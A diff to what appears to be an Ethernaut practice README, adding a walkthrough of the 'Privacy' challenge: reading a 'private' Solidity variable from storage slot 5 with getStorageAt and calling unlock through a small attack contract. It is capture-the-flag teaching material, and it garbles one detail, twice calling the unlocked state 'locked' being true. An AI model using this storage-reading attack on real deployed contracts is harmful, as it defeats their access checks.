@@ -326,6 +326,72 @@ Look at the way `isLastFloor` is implemented above, as when `goTo` function will
 
 Hence, deploy the solution contract and call `goTo`
 
+## 12 - Privacy
+
+For reference -> [Challenge](./questions/12.Privacy.sol) | [Solution](./answers/12.Privacy.sol)
+
+This challenge is all about how private variables can be accessed and thus when a storage variable is marked with keyword `private`, it doesn't means that data cannot be accessed. The `Privacy` contract looks like this:
+
+```solidity
+    contract Privacy {
+        bool public locked = true;
+        uint256 public ID = block.timestamp;
+        uint8 private flattening = 10;
+        uint8 private denomination = 255;
+        uint16 private awkwardness = uint16(now);
+        bytes32[3] private data;
+
+        constructor(bytes32[3] memory _data) public {
+            data = _data;
+        }
+
+        function unlock(bytes16 _key) public {
+            require(_key == bytes16(data[2]));
+            locked = false;
+        }
+    }
+```
+
+If you notice, to unlock the `locked` i.e make it true...we need to pass the `bytes16` key which is the last elementof the `data` array. Now, let's see on which slot our required `key` resides:
+
+```typescript
+| Slot 0 | bool locked |
+| Slot 1 | uint256 ID |
+| Slot 2 | uint8 flattening + unit8 denomination + uint16 awkwardness |
+| Slot 3 | bytes32 data[0] |
+| Slot 4 | bytes32 data[1] |
+| Slot 5 | bytes32 data[2] |
+```
+
+Hence it lies on 5th slot, so all we need to do is get the storage of 5th slot and pass it to the `unlock` function. But there's one more thing i.e the value we get in slot 5th is a 32-bytes value whereas unlock requires a 16-bytes value, that's why we be using another contract to solve this problem.
+
+***Note: If you having any trouble in understanding the private storages and how they work, refer to the [Bonus](./Bonus/PrivateStorages/) section.***
+
+Now, let's solve this challenge:
+
+1. Deploy the contract provided in [Solution](./answers/12.Privacy.sol) file.
+
+2. Get the key from the 5th slot, by using the `web3.eth.getStorageAt` function in your browser's console.
+
+```javascript
+    await web3.eth.getStorageAt(contract.address, 5, console.log) // console.log will print the key such that we can copy it down
+```
+
+3. Now, pass the key as an argument to `attack` function. This will first turn our 32-bytes value to 16-bytes and then call the `unlock` function of `Privacy` contract.
+
+```solidity
+    function attack(bytes32 _slotValue) external {
+        bytes16 key = bytes16(_slotValue);
+        target.unlock(key); // where target is the instance of Privacy contract
+    }
+```
+
+4. At last check whether the `locked` is true or not and submit!
+
+```javascript
+    await contract.locked()
+```
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
